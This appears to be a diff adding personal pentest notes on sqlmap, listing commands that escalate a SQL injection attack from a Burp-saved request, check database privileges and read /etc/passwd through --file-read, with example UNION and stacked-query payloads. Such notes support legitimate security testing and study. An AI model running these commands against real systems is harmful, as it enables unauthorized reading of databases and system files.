@@ -1,0 +1,14 @@
+# SQLMap commands
+
+1) sqlmap -r file.req --risk 3 --level 5   # to increase the speed of attack. you save a request as file from burpsuite
+2) sqlmap -r file.req --risk 3 --level 5 --technique=BUE   # --technique has 5 options B: boolean, E: error, U: union, S: stacked, T: time, Q: inline query 
+3) sqlmap -r file.req --risk 3 --level 5 --technique=BUE --batch --privilege   # to get what privilege you have on that database
+4) sqlmap -r file.req --risk 3 --level 5 --technique=BUE --batch --privilege --file-read=/etc/passwd  # if you have FILE privilege you can read files from the system
+
+# --technique means the sql injection tecnique you want to try 
+
+# B --> try true or flase sql query like:  1=1 , 1=0
+# U --> try union query like: UNION SELECT NULL,NULL,username FROM users;
+# E --> try to inject an error query 
+# T --> try to cause delay to check something. Time based sql injection
+# S --> try to insert multiple queries seperated by ; like: {original_query}; SELECT * FROM users;
